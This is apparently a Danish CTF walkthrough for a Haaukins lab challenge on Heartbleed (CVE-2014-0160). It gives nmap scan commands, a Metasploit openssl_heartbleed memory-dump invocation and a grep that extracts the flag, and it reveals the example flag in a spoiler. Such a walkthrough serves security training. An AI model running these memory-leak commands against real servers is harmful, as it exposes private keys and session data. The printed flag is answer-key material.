Heartbleed

Læk serverens hukommelse med en berømt TLS-bug.

Web exploitationHaaukins CTF
🎓 Prøv selv først. Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.

Hvad går opgaven ud på?

En af lab'ets servere er Heartbleed-sårbar — en del af opgaven er at finde den. Heartbleed (CVE-2014-0160) lader en klient bede om op til ~64 KB i et TLS-heartbeat-svar men sende en lille payload → serveren lækker tilstødende proces-hukommelse (nøgler, sessioner … eller flaget).

Trin for trin

nmap -Pn -p443 --open <subnet>/24                 # find TLS-servere
nmap -Pn -p443 --script ssl-heartbleed <ip>        # State: VULNERABLE
msfconsole -q -x "use auxiliary/scanner/ssl/openssl_heartbleed; \
  set RHOSTS <ip>; set RPORT 443; set ACTION DUMP; run; exit -y"
grep -aoE 'HKN\{[^}]*\}' ~/.msf4/loot/*heartble*.bin | sort | uniq -c | sort -rn

Faldgrube: lækket hukommelse er støjende — ét leak kan give en forvansket variant. Kør flere leaks og tag den streng der går igen flest gange.

🚩 Vis løsning & eksempel-flag 
10324  HKN{1JM-fuD-Ywxn}
    1  HKN{1@ JM-fuD-Ywxn}   <- støj, ignorér

Flag (eksempel): HKN{1JM-fuD-Ywxn}

Hvad du har lært

  • Navngiver opgaven et CVE, så slå exploitet op (nmap NSE, Metasploit-modul, manuel PoC).
  • Ingen host oplyst? Start lab'et, se Hosts-siden, scan subnettet for porten.
  • Memory-leaks er støjende → gentag og tag det konsistente resultat.
